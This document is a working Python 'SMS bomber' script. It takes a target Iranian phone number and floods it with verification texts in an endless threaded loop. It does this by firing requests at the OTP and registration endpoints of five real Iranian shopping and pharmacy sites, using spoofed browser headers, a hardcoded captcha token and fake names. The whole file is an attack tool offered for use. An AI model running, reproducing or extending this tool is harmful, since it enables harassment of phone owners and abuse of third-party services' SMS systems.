from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3
from time import sleep
import random
import socket

# ------------------------------
# Imports & Setup
# ------------------------------
urllib3.disable_warnings()

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
b = '\033[34;1m'
p = '\033[35;1m'
w = '\033[37;1m'
a = '\033[0m'
d = '\033[90;1m'

# System info
Node, System, Release = node(), system(), release()

# ------------------------------
# Helpers
# ------------------------------
def clear_screen():
    os_system('clear' if name == 'posix' else 'cls')

def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS Services
# ------------------------------
def khanoumi(phone):
    import requests
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://accounts.khanoumi.com/api/nim/v1/account/login/init"
    
    payload = {"phone": formatted_phone}
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://accounts.khanoumi.com",
        "Referer": "https://accounts.khanoumi.com/",
        "X-l": "niam"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(khanoumi) {a}Code Sent')
            return True
        print(f'{r}[-] (khanoumi) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] khanoumi Exception: {e}{a}')
        return False

def theshoes(phone):
    import requests
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://theshoes.ir/api/v1/sessions/login_request"
    
    payload = {
        "mobile_phone": formatted_phone,
        "recaptcha_token": "0cAFcWeA5MJK2It57msac1Lrod43ZPVSmSZgpDOprkHZPb2pL1Ph2tH3pUAAhiW9X94uU6ESoQ7FPaANWGmw6Eu7ioXk_Z-k3N1VPZz8JMeCyHQD_j1Rp1w88q6_qIXNs9pD-co-MZhTgSXD6fwMhZQox0N6uuqrtGWWoJiz_ddnXCT-wXQW5jVgQ4v2tKe8KYbA132byBZee2B619gAkjBYu_Qgx_J_JUg788e6nkbv7SlE9XQ7b2Fs3oGjRTpkNIa6Z130ctx6lJmR45n_mriuEM4agPlfmH6fGfsuIToXQfJH7UjflgziJmcgbqPtu8QBZl4RJ_-Z6souAUsf3RUFCIr00jUGcY-FvfeDfevW6S3jAgExRp8lpHtXiNPuRtD-AJ0d6TTONs8t1d2VnZR5wQ9FGfCIkB3y1FjXFZUyueeQ3JsaPXXcMFFphZ9GP2yJAiByS5DaRSTUYktJRy7Fzy4MaGnRty8J-A-6u20A6UJhgOfDu8iwMdWu17m-U0xtD18AEDr07k97oaCVZWaeGcSkhd8bmxNXTdozx2rnLNMwS0G_nUFp0TCMN_l0A4sLLPSSkVA1ZJjplEEdS9iR09mM7JFVybDC-loo2o_43ODpXcsoTH2NVwpQNoGcGwzXu6seTTYtHzXXjZ1DyWXBhKST9Rv6q8bYKW6WG-qLah1_BChXZK1k5EoyG4vv_n9MiZEkHaF-BAeAROk0ZzCBiJzerdV6fw5O9yuaV8tzYD0MUQxfvRPJQfi0uoZ2EWWW_j0eLKGL_84XA5Y2gOiIK4jpi239ZbJ35EiY3_g00QcRbgYVMm3vXwSJb-szhqjrSTVDHMY4uqzuJFQxbxuxvVKuEdPMAE2h4KQ_ekOGgc74DvyifwlsFfZQEnz2w0Y1YlN12LJddTNsSfHD2JlnBbgOnTW35nkRHLK_5HgFN7BS6k7MP21a_sx2vjvC9gQ37yARbrDQ_dCLTU_OPLe5MiUp8RoiV5cq26LThBgbompZzDtxZRIdPXkDS0sLPxQlAKCGPcHdKXCFTtLzNYqMShREvpjiTREWcv-bXUi0m2hm0cM0fGaws9_XIqw1hznw0z-tpgTl4amEXul-4RkOthPw5OOW1zAFo_NzMecvSsviCJQDbXo0tKtxW8sSetHqIt5GohMUAukuOuAnbg_w_g2aQW3sZZzKBFRM1rsnGE8UB-PtMfg3EBn1QkIEa-gx5f6G8N6w25_uHSztune1hOTKuLWNrUHacGd7Nb-nE6DQkno6NvFTsTGyB9Id9XLy6E7wVJbFsdF-bkC2Jff19Bz6I2OeDktZUMqZv-mAuhyWx8Lo4c-lGQtaXPD5_PmaR7MkhEH-XM4v2hWKzqq1YoN9CmoabnOu1S16lJchyX1uNL59HgT0BW6xgIeFjgw6EJGy3nN6fS02Eve_LEb1ZNQmX4XlEN3tsU-1gsK0nXcO9dejaaBxTvSU7UrMrJlEjiSHjtLYW17alHzaOgcU2kBQF4-l-939QHpUbJjBS0cSyD4tWUdwn47amgr_24nRuB_oJ67SjKZhVsYkAuXD6_i4iTlM6inCEU4y6TvHsmhqfTVNIB6m7o8cPq3ePcub4okRdC_s-cCrrLCwhR6dMGnODYo5__xg"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://theshoes.ir",
        "Referer": "https://theshoes.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(theshoes) {a}Code Sent')
            return True
        print(f'{r}[-] (theshoes) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] theshoes Exception: {e}{a}')
        return False

def darukade(phone):
    import requests
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://darukade.com/api/auth/register"
    
    payload = {
        "Mobile": formatted_phone,
        "FirstName": "نام",
        "LastName": "خانوادگی", 
        "Gender": "false"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://darukade.com",
        "Referer": "https://darukade.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(darukade) {a}Code Sent')
            return True
        print(f'{r}[-] (darukade) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] darukade Exception: {e}{a}')
        return False

def mahabadperfume(phone):
    import requests
    import uuid
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mahabadperfume.ir/backend/customer/v2/otp-send/s/"
    
    payload = {
        "phone_number": formatted_phone,
        "is_forget_password": False
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Customer-Signature": str(uuid.uuid4()),
        "Origin": "https://mahabadperfume.ir",
        "Referer": "https://mahabadperfume.ir/",
        "accept-language": "fa-IR",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(mahabadperfume) {a}Code Sent')
            return True
        print(f'{r}[-] (mahabadperfume) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] mahabadperfume Exception: {e}{a}')
        return False

def angeliran(phone):
    import requests
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    url = "https://angeliran.com/wp-admin/admin-ajax.php"
    
    payload = {
        "digits_phone": formatted_phone,
        "login_digt_countrycode": "+98",
        "action_type": "phone",
        "digits_reg_name": "نام",
        "digits_process_register": "1",
        "sms_otp": "",
        "otp_step_1": "1",
        "digits_otp_field": "1",
        "digits": "1",
        "instance_id": "6f8ca37725ee2166c8fc02c16e17a299",
        "action": "digits_forms_ajax",
        "type": "login",
        "digits_redirect_page": "https://angeliran.com/my-account/",
        "digits_form": "23837de77d",
        "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
        "show_force_title": "1",
        "container": "digits_protected",
        "sub_action": "sms_otp"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://angeliran.com",
        "Referer": "https://angeliran.com/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(angeliran) {a}Code Sent')
                return True
        print(f'{r}[-] (angeliran) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (angeliran) Failed{a}')
        return False

# ------------------------------
# Service Runner
# ------------------------------
def send_service_safe(service, phone):
    result = service(phone)
    if result:
        print(f"{g}[+] {service.__name__}: Code Sent!{a}")
    else:
        print(f"{y}[-] {service.__name__}: Failed or No Response{a}")

# ------------------------------
# SMS Bomber
# ------------------------------
def Vip(phone, Time):
    services = [
        khanoumi,
        theshoes,
        darukade,
        mahabadperfume,
        angeliran
    ]
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        clear_screen()

# ------------------------------
# Phone validation
# ------------------------------
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    clear_screen()
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# ------------------------------
# Main Loop
# ------------------------------
def main():
    while True:
        choice = main_menu()
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented yet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

# ------------------------------
# Entry Point
# ------------------------------
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection detected!{a}")
    else:
        main()
